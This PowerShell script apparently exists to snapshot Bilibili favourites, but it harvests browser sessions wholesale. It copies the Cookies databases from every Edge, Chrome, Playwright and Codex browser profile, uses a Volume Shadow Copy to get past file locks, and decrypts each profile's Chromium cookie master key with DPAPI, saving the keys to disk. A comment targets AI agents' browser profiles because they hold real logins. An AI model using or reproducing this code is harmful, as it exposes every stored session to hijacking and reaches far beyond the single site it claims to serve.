param(
  [string]$OutDir = (Join-Path $env:TEMP "bili-fav-snap")
)

$ErrorActionPreference = "Stop"

if (Test-Path -LiteralPath $OutDir) {
  Get-ChildItem -LiteralPath $OutDir -File | ForEach-Object { Remove-Item -LiteralPath $_.FullName -Force }
} else {
  New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
}

$roots = [ordered]@{
  edge   = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
  chrome = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
}

# Chromium-based apps keep their own user-data dir (Playwright bundles, Codex's
# built-in browser, ...). They hold real logins often enough to be worth scanning.
$pwRoot = Join-Path $env:LOCALAPPDATA "ms-playwright-mcp"
if (Test-Path -LiteralPath $pwRoot) {
  Get-ChildItem -LiteralPath $pwRoot -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    $roots["pw-" + $_.Name] = $_.FullName
  }
}
$codexRoot = Join-Path $env:LOCALAPPDATA "CodexDreamSkin\cdp-profile"
if (Test-Path -LiteralPath $codexRoot) { $roots["codex"] = $codexRoot }

$manifest = @()
$shadow = $null
$dev = $null
Add-Type -AssemblyName System.Security

function Get-OsCryptKey {
  param([string]$LocalStatePath, [string]$KeyOutPath)
  try {
    $ls = Get-Content -LiteralPath $LocalStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
    $b64 = $ls.os_crypt.encrypted_key
    if (-not $b64) { return $false }
    $blob = [Convert]::FromBase64String($b64)
    $enc = New-Object byte[] ($blob.Length - 5)
    [Array]::Copy($blob, 5, $enc, 0, $enc.Length)
    $key = [Security.Cryptography.ProtectedData]::Unprotect($enc, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
    $hex = ($key | ForEach-Object { $_.ToString("x2") }) -join ""
    Set-Content -LiteralPath $KeyOutPath -Value $hex -NoNewline -Encoding ASCII
    return $true
  } catch {
    return $false
  }
}

try {
  $r = ([wmiclass]"root\cimv2:Win32_ShadowCopy").Create("C:\", "ClientAccessible")
  if ($r.ReturnValue -eq 0) {
    $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $r.ShadowID } | Select-Object -First 1
    $dev = $shadow.DeviceObject
    Start-Sleep -Seconds 2
  }
} catch {
  $dev = $null
}

foreach ($name in $roots.Keys) {
  $root = $roots[$name]
  if (-not (Test-Path -LiteralPath $root)) { continue }
  $profiles = Get-ChildItem -LiteralPath $root -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile *" }
  # some apps keep the profile directly in the root directory
  if (Test-Path -LiteralPath (Join-Path $root "Network\Cookies")) {
    $profiles = @([pscustomobject]@{ FullName = $root; Name = "." }) + @($profiles)
  }
  foreach ($p in $profiles) {
    $rel = $p.FullName.Substring(3)
    $cookieSrc = Join-Path $p.FullName "Network\Cookies"
    $stateSrc = Join-Path $root "Local State"
    $tag = "$name-" + ($p.Name -replace "[^\w\.\-]", "_")
    $cookieDst = Join-Path $OutDir "$tag-Cookies"
    $stateDst = Join-Path $OutDir "$tag-LocalState"
    $gotCookie = $false
    $gotState = $false

    if ($dev) {
      $shadowCookie = "$dev\$rel\Network\Cookies"
      $shadowState = "$dev\$($root.Substring(3))\Local State"
      try { Copy-Item -LiteralPath $shadowCookie -Destination $cookieDst -Force -ErrorAction Stop; $gotCookie = $true } catch {}
      try { Copy-Item -LiteralPath $shadowState -Destination $stateDst -Force -ErrorAction Stop; $gotState = $true } catch {}
    }
    if (-not $gotCookie) {
      try { Copy-Item -LiteralPath $cookieSrc -Destination $cookieDst -Force -ErrorAction Stop; $gotCookie = $true } catch {}
    }
    if (-not $gotState) {
      try { Copy-Item -LiteralPath $stateSrc -Destination $stateDst -Force -ErrorAction Stop; $gotState = $true } catch {}
    }
    if ($gotCookie) {
      $keyDst = Join-Path $OutDir "$tag-key.hex"
      $gotKey = $false
      if ($gotState) { $gotKey = Get-OsCryptKey -LocalStatePath $stateDst -KeyOutPath $keyDst }
      $manifest += [pscustomobject]@{
        browser = $name
        profile = $p.Name
        cookies = $cookieDst
        localState = $(if ($gotState) { $stateDst } else { $null })
        key = $(if ($gotKey) { $keyDst } else { $null })
      }
    }
  }
}

if ($shadow) { try { $shadow.Delete() | Out-Null } catch {} }

$manifestPath = Join-Path $OutDir "manifest.json"
$manifest | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $manifestPath -Encoding UTF8
Write-Output $manifestPath
